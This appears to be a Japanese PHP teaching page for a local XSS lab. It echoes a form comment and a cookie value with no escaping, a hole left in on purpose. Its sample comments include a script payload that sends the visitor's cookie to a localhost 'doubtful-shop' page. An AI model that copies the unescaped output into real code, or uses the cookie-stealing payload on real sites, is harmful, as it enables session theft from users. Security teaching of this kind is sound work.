<?php 
  setcookie("name", "ws", time() + (60 * 60 * 24 * 90));
?>

<div>
  <h2> XSS(クロスサイトスクリプティング) </h2>

  <p>
    <i>不正なスクリプトを埋め込んで実行する攻撃</i><br />
  </p>

  <h3>コメントを入力してください</h3>
  <form method="POST" action="index.php">
    <textarea type="text" name="comment" style="width: 240px; height: 240px;"></textarea>
    <input type="submit" value="送信" />
  </form>

  <p style="color: gray;">
    <i>以下の内容でコメントする</i>
  </p>
  <ul>
    <li>PHPは最高らしいです</li>
    <li>有休消化の「うきゅ」の部分かわいくないですか？</li>
    <li>
      http://localhost:8080/attack/xss/index.php?name=<>script<>location.href='http://localhost:8080/attack/xss/doubtful-shop.php?param=' +
      document.cookie.split(";")[0].split("=")[1]<>/script<>
    </li>
  </ul>

  <?php
    $comment = $_POST["comment"];
  ?>
  <h3>コメント</h3>
  <p>
    <?= $_COOKIE["name"] ?>
    さん：
    <?=$comment ?>
  </p>

  <a href="http://localhost:8080">戻る</a>

</div>